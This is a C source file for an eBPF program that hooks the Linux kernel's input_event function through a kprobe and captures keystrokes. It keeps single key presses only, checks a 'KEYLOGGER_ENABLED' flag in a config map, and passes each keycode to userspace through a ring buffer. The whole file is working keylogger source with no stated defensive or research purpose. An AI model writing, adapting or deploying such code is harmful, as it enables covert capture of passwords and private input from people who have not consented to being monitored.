#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include "bpf/keylogger.h"
#include "bpf/maps.h"

#define EV_KEY 0x01
#define KEY_PRESS 1

/**
 * @brief input_event hook
 * submitting key sinlge presses to userspace for processing
 * 
 */
SEC("kprobe/input_event")
int BPF_KPROBE(trace_input_event, struct input_dev *dev, unsigned int type, unsigned int code, int value)
{
    /* Only capture key single press events */
    if (type != EV_KEY || value != KEY_PRESS)
        return 0;

    u32 key = KEYLOGGER_ENABLED;
    u32 *enabled = bpf_map_lookup_elem(&config_map, &key);

    if (!enabled || *enabled == 0)
        return 0;

    /* Reserve space in ring buffer */
    struct key_event_t *event = bpf_ringbuf_reserve(&keylog_events, sizeof(*event), 0);
    if (!event)
        return 0;

    /* Collect keycode */
    event->code = code;
    event->value = value;

    /* Submit event to userspace */
    bpf_ringbuf_submit(event, 0);
    return 0;
}
